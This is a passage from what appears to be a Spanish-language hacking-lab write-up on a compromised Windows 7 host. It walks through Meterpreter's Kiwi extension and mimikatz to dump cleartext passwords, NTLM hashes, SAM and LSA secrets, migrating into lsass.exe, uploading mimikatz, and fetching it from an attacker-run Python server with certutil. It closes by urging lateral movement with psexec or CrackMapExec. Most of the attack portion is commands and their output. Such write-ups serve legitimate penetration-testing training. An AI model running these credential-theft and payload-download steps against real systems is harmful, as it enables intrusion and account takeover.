meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
```

El **módulo Kiwi**, nos permite varias cosillas pues trabaja con **mimikatz**, pero lo más importante es que nos ayuda a obtener las **credenciales de los usuarios registrados, los hashes de SAM y los LSA_SECRETS**.

* **Dumpeando Credenciales**:

```bash
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username       Domain    NTLM                              SHA1
--------       ------    ----                              ----
Administrator  haris-PC  cdf51b162460b7d5bc898f493751a0cc  dff1521f5f2d7436a632d26f079021e9541aba66

wdigest credentials
===================

Username       Domain     Password
--------       ------     --------
(null)         (null)     (null)
Administrator  haris-PC   ejfnIWWDojfWEKM
HARIS-PC$      WORKGROUP  (null)

kerberos credentials
====================

Username       Domain     Password
--------       ------     --------
(null)         (null)     (null)
Administrator  haris-PC   (null)
haris-pc$      WORKGROUP  (null)
```
De esta forma, obtuvimos las credenciales del **usuario administrador**, incluso la obtuvimos en texto claro.

* **Dumpeando los Hashes de SAM**:

```bash
meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping SAM
Domain : HARIS-PC
SysKey : a749692f1dc76b46d7141ef778aa6bef
Local SID : S-1-5-21-319597671-3711062392-2889596693

SAMKey : a226d4d47dab3eb7a306c8b85ec359cb

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: cdf51b162460b7d5bc898f493751a0cc

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : haris
  Hash NTLM: 8002bc89de91f6b52d518bde69202dc6
```
Obtenemos el hash del **administrador** y del **usuario harris**.

* **Dumpeando los LSA SECRETS**:

```bash
meterpreter > lsa_dump_secrets
[+] Running as SYSTEM
[*] Dumping LSA secrets
Domain : HARIS-PC
SysKey : a749692f1dc76b46d7141ef778aa6bef

Local name : haris-PC ( S-1-5-21-319597671-3711062392-2889596693 )
Domain name : WORKGROUP

Policy subsystem is : 1.11
LSA Key(s) : 1, default {060be82b-0750-887a-808d-0774087457db}
  [00] {060be82b-0750-887a-808d-0774087457db} d28ec83ef05184b93100beaa4d64a6a1a420b8a7a144c943fe57f60fbaa6425d

Secret  : DefaultPassword
old/text: kERjCoEmxdlSD

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 0a f3 a4 c2 1c ac 07 2f 83 07 61 b5 02 67 89 78 95 2d f3 0d 0f c8 4e 4e a5 c8 92 f6 74 a6 ea b6 fb 62 3e a7 93 cf cf 6f 
    full: 0af3a4c21cac072f830761b502678978952df30d0fc84e4ea5c892f674a6eab6fb623ea793cfcf6f
    m/u : 0af3a4c21cac072f830761b502678978952df30d / 0fc84e4ea5c892f674a6eab6fb623ea793cfcf6f
old/hex : 01 00 00 00 c9 22 d6 0b 83 9e dd 98 a7 ad 7a 5a c5 ff 4e bb 8a d2 6f 01 61 be bf d4 bc 70 54 70 fd df 46 12 a8 c5 e5 2d 98 6c 79 71 
    full: c922d60b839edd98a7ad7a5ac5ff4ebb8ad26f0161bebfd4bc705470fddf4612a8c5e52d986c7971
    m/u : c922d60b839edd98a7ad7a5ac5ff4ebb8ad26f01 / 61bebfd4bc705470fddf4612a8c5e52d986c7971
```

Con esto, terminamos de usar el **módulo Kiwi**, ahora podemos cargar el programa **mimikatz.exe** para poder obtener lo mismo que hizo **Kiwi**.

### Usando Mimikatz en Máquina Víctima {#mimik2}

Para que el **mimikatz.exe** funcione debe ser ejecutado como un **administrador**, para identificarnos como **administrador** desde el **Metasploit Framework**, necesitamos migrar a un proceso que es ejecutado unicamente como **administrador**, el más común de estos procesos es el **lsass.exe**. Para migrar a este proceso, necesitamos su **PID** y que tengamos permisos suficientes para esta migración, hagamos esto por pasos:

* Viendo procesos:
```bash
meterpreter > ps
-
Process List
============
-
 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System             x64   0
 236   4     smss.exe           x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 268   428   spoolsv.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 320   312   csrss.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 328   428   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE
 364   312   wininit.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 392   372   csrss.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 428   364   services.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 464   372   winlogon.exe       x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 476   364   lsass.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 484   364   lsm.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 592   428   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 668   428   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE
 728   428   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 756   464   LogonUI.exe        x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 816   428   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 864   428   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 900   428   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 1036  428   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 1128  428   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 1268  428   VGAuthService.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
 1316  428   vmtoolsd.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 1596  428   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE
 1792  592   WmiPrvSE.exe
 1972  428   msdtc.exe          x64   0        NT AUTHORITY\NETWORK SERVICE
 2460  428   sppsvc.exe         x64   0        NT AUTHORITY\NETWORK SERVICE
 2508  428   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 2584  428   SearchIndexer.exe  x64   0        NT AUTHORITY\SYSTEM
```

* Obteniendo **PID** del proceso **lsass.exe**:
```bash
meterpreter > pgrep lsass
476
```

* Migrando a este proceso:
```bash
meterpreter > migrate 476
[*] Migrating from 268 to 476...
[*] Migration completed successfully.
```

Una vez que ya hemos migrado de proceso, vamos a cargar el programa de **mimikatz.exe**, este programa esta por default en **Kali**:
```bash
meterpreter > upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
[*] Uploading  : /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
[*] Uploaded 1.29 MiB of 1.29 MiB (100.0%): /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
[*] Completed  : /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
meterpreter > dir
Listing: C:\
============

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
040777/rwxrwxrwx  0        dir   2017-07-21 01:56:27 -0500  $Recycle.Bin
040777/rwxrwxrwx  0        dir   2022-02-18 09:11:31 -0600  Config.Msi
040777/rwxrwxrwx  0        dir   2009-07-14 00:08:56 -0500  Documents and Settings
040777/rwxrwxrwx  0        dir   2009-07-13 22:20:08 -0500  PerfLogs
040555/r-xr-xr-x  4096     dir   2022-02-18 09:02:50 -0600  Program Files
040555/r-xr-xr-x  4096     dir   2017-07-14 11:58:41 -0500  Program Files (x86)
040777/rwxrwxrwx  4096     dir   2017-12-23 20:23:01 -0600  ProgramData
040777/rwxrwxrwx  0        dir   2022-02-18 08:09:14 -0600  Recovery
040777/rwxrwxrwx  0        dir   2017-07-14 08:48:44 -0500  Share
040777/rwxrwxrwx  4096     dir   2024-03-11 21:41:55 -0600  System Volume Information
040555/r-xr-xr-x  4096     dir   2017-07-21 01:56:23 -0500  Users
040777/rwxrwxrwx  16384    dir   2024-03-11 21:21:40 -0600  Windows
100777/rwxrwxrwx  1355264  fil   2024-03-11 22:45:55 -0600  mimikatz.exe
000000/---------  0        fif   1969-12-31 18:00:00 -0600  pagefile.sys
```

Y nos metemos con una shell a la máquina:
```bash
meterpreter > shell
Process 1384 created.
Channel 3 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\>
```

Ahora, ejecutamos el programa **mimikatz.exe**:
```batch
C:\>.\mimikatz.exe
.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```

Revisamos que tengamos los privilegios necesarios para dumpear los hashes:
```batch
mimikatz # privilege::debug
Privilege '20' OK
```

Y obtenemos las credenciales:
```batch
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 542841 (00000000:00084879)
Session           : Interactive from 0
User Name         : Administrator
Domain            : haris-PC
Logon Server      : HARIS-PC
Logon Time        : 12/03/2024 03:21:36
SID               : S-1-5-21-319597671-3711062392-2889596693-500
        msv :
         [00010000] CredentialKeys
         * NTLM     : cdf51b162460b7d5bc898f493751a0cc
         * SHA1     : dff1521f5f2d7436a632d26f079021e9541aba66
         [00000003] Primary
         * Username : Administrator
         * Domain   : haris-PC
         * NTLM     : cdf51b162460b7d5bc898f493751a0cc
         * SHA1     : dff1521f5f2d7436a632d26f079021e9541aba66
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : haris-PC
         * Password : ejfnIWWDojfWEKM
        kerberos :
         * Username : Administrator
         * Domain   : haris-PC
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
...
```

También obtenemos los hashes del **SAM**:
```batch
mimikatz # lsadump::sam
Domain : HARIS-PC
SysKey : a749692f1dc76b46d7141ef778aa6bef
Local SID : S-1-5-21-319597671-3711062392-2889596693

SAMKey : a226d4d47dab3eb7a306c8b85ec359cb

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: cdf51b162460b7d5bc898f493751a0cc

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : haris
  Hash NTLM: 8002bc89de91f6b52d518bde69202dc6
```

### Cargando Mimikatz desde Nuestra Máquina {#mimik3}

Por último, vamos a cargar **mimikatz** desde nuestra máquina, utilizando **certutil.exe**

Primero, vamos a abrir un servidor en **Python**:
```bash
python3 -m http.server 80
```

Ahora con **certutil.exe**, descargamos **mimikatz** en la máquina víctima:
```batch
C:\>certutil.exe -f -urlcache -split http://Tu_IP/mimikatz.exe
certutil.exe -f -urlcache -split http://Tu_IP/mimikatz.exe
****  Online  ****
  000000  ...
  14ae00
CertUtil: -URLCache command completed successfully.
```

Revisamos que se haya descargado correctamente:
```batch
C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of C:\

12/03/2024  05:15            73,802 eternal-blue.exe
12/03/2024  06:04         1,355,264 mimikatz.exe
14/07/2009  03:20    <DIR>          PerfLogs
...
```

Y listo, ahora podemos usar la herramienta **mimikatz.exe** para obtener los hashes y credenciales.

Ahora que tienes las credenciales y hashes, puedes probar a conectarte a la máquina con la herramienta **psexec** o con **Crackmapexec** alzar el **servicio RDP** y conectarte, etc. ¡Intentalo!.
